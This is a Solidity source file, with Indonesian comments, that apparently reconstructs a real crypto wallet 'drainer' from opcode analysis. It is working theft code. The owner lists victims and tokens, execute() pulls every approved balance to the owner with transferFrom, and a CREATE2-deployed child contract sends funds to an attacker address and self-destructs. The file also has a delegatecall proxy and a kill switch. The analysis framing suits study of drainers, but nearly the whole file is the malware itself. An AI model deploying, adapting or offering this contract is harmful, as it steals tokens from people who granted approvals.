// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// ============================================================
// MIRIP DRAINER 0x0F7A...0E — 8 FUNCTION SELECTORS
// ============================================================
// Fungsi-fungsi yang kemungkinan ada di drainer asli
// berdasarkan analisa opcode: CALL, CREATE2, DELEGATECALL, SELFDESTRUCT
// ============================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract DrainerAsli {
    // Storage variables (mirip slot analysis)
    address public owner;                    // Slot 0: 0x01 (initialized)
    mapping(uint => address) public victims;  // Mapping victims
    mapping(uint => address) public tokens;   // Mapping supported tokens
    uint public victimCount;                  // Jumlah victim
    uint public tokenCount;                   // Jumlah token
    
    // SELFDESTRUCT exploit tracker
    uint public exploitCount;                 // Berapa kali exploit deploy
    
    constructor() {
        owner = msg.sender;
    }
    
    // ============================================
    // SELECTOR 1: 0x3a5be8cb → init/setup
    // ============================================
    function init(address[] calldata _tokens) external {
        require(msg.sender == owner, "!owner");
        for (uint i = 0; i < _tokens.length; i++) {
            tokens[tokenCount++] = _tokens[i];
        }
    }
    
    // ============================================
    // SELECTOR 2: 0x43000817 → add victims
    // ============================================
    function add(address[] calldata _victims) external {
        require(msg.sender == owner, "!owner");
        uint start = victimCount;
        victimCount += _victims.length;
        for (uint i = 0; i < _victims.length; i++) {
            victims[start + i] = _victims[i];
        }
    }
    
    // ============================================
    // SELECTOR 3: 0x4bdbd028 → execute drain via CALL
    // ============================================
    function execute() external returns (uint) {
        require(msg.sender == owner, "!owner");
        uint total;
        for (uint v = 0; v < victimCount; v++) {
            address user = victims[v];
            for (uint t = 0; t < tokenCount; t++) {
                address token = tokens[t];
                uint allow = IERC20(token).allowance(user, address(this));
                if (allow == 0) continue;
                uint bal = IERC20(token).balanceOf(user);
                if (bal == 0) continue;
                uint amt = allow < bal ? allow : bal;
                (bool ok,) = token.call(abi.encodeWithSignature(
                    "transferFrom(address,address,uint256)", user, owner, amt
                ));
                if (ok) total += amt;
            }
        }
        return total;
    }
    
    // ============================================
    // SELECTOR 4: 0x616c6c20 → "all..." getter
    // ============================================
    function allSupportedTokens() external view returns (uint) {
        return tokenCount;
    }
    
    function allVictimCount() external view returns (uint) {
        return victimCount;
    }
    
    // ============================================
    // SELECTOR 5: 0xa58d50d3 → admin: change owner
    // ============================================
    function setOwner(address _new) external {
        require(msg.sender == owner, "!owner");
        owner = _new;
    }
    
    // ============================================
    // SELECTOR 6: 0xb156103f → check allowance
    // ============================================
    function check(address token, address[] calldata _users) 
        external view returns (uint[] memory) 
    {
        uint[] memory allowances = new uint[](_users.length);
        for (uint i = 0; i < _users.length; i++) {
            allowances[i] = IERC20(token).allowance(_users[i], address(this));
        }
        return allowances;
    }
    
    // ============================================
    // SELECTOR 7: 0xc41e8295 → DELEGATECALL proxy
    // ============================================
    function proxy(address target, bytes calldata data) external {
        require(msg.sender == owner, "!owner");
        (bool ok,) = target.delegatecall(data);
        require(ok, "proxy failed");
    }
    
    // ============================================
    // SELECTOR 8: 0xef8738d3 → deploy exploit + selfdestruct
    // ============================================
    function createExploit(bytes32 salt, address attacker) external returns (address) {
        require(msg.sender == owner, "!owner");
        ExploitChild exp = new ExploitChild{salt: salt}(address(this), attacker);
        exploitCount++;
        return address(exp);
    }
    
    // Self-destruct by owner
    function kill() external {
        require(msg.sender == owner, "!owner");
        selfdestruct(payable(owner));
    }
}

// ============================================
// EXPLOIT CHILD — Deploy via CREATE2
// ============================================
contract ExploitChild {
    address public drainContract;
    address public attacker;
    
    constructor(address _drain, address _attacker) {
        drainContract = _drain;
        attacker = _attacker;
    }
    
    // Dipanggil via DELEGATECALL dari DrainerAsli.proxy()
    function pull(address token, address[] calldata users) external {
        for (uint i = 0; i < users.length; i++) {
            uint allow = IERC20(token).allowance(users[i], drainContract);
            if (allow == 0) continue;
            uint bal = IERC20(token).balanceOf(users[i]);
            if (bal == 0) continue;
            uint amt = allow < bal ? allow : bal;
            bool ok = IERC20(token).transferFrom(users[i], attacker, amt);
            require(ok, "transferFrom failed");
        }
        selfdestruct(payable(attacker));
    }
}
